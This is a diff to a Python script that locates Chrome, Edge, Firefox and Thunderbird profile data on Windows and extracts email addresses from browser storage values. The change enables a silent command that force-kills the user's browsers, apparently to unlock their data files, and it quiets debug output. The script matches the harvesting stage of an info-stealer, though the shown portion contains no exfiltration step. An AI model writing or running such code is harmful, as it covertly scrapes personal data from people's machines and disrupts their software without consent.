@@ -27,7 +27,7 @@ firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profile
 thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-#os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
+os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
 
 def decode_with_fallback(data):
     
@@ -122,10 +122,10 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                         value_str, value_enc = decode_with_fallback(value)
                         value_str = value_str.replace('\u263a', '').strip()
                         value_str = extract_json(value_str)
-                        print(f"for value : {value_enc}")
+                        # print(f"for value : {value_enc}")
                         decoded = f"{key_str} {value_str}"
-                        #print(decoded)
-                        print(value_str.strip())
+                        # print(decoded)
+                        # print(value_str)
                         if value_str.strip().startswith('{') or value_str.strip().startswith('['):
                             try:
                                 json_data = json.loads(value_str)
@@ -163,9 +163,10 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                             except Exception as e :
                                 print(f"Error decompressing value: {e}, skipping this entry.")
                         value_str, value_enc = decode_with_fallback(value)
-                        print(f"for value : {value_enc}")
-                        decoded = f"{key_str} {value_str}"
-                        #print(decoded)
+                        value_str = value_str.strip()
+                        # print(f"for value : {value_enc}")
+                        # decoded = f"{key_str} {value_str}"
+                        # print(decoded)
                         emails.extend(re.findall(email_pattern, key_str))
                         emails.extend(re.findall(email_pattern, value_str))
                     except Exception as e:
